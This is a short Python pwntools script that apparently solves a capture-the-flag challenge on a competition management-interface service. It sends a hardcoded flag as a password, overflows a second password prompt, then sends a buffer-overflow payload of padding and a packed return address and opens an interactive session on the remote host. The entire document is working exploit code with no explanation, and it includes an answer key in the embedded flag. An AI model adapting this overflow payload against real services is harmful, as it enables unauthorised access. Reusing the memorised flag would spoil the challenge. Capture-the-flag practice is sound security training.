from pwn import *

payload = "quit" + "\x00" + "A" * 51
payload += p64(0x41414227)

p = remote('mngmnt-iface.ctfcompetition.com', 1337)
# p = process('./bin')

p.recvuntil('Quit')
print 1
p.send('1\r\n');
p.recvuntil('password:')
print 2
p.send('CTF{I_luv_buggy_sOFtware}\r\n')
p.recvuntil('password:')
print 3
raw_input('#pausing')
p.send("A"*35 + '\r\n')
p.recvuntil('Authenticated')
print 4

p.send(payload)
p.interactive()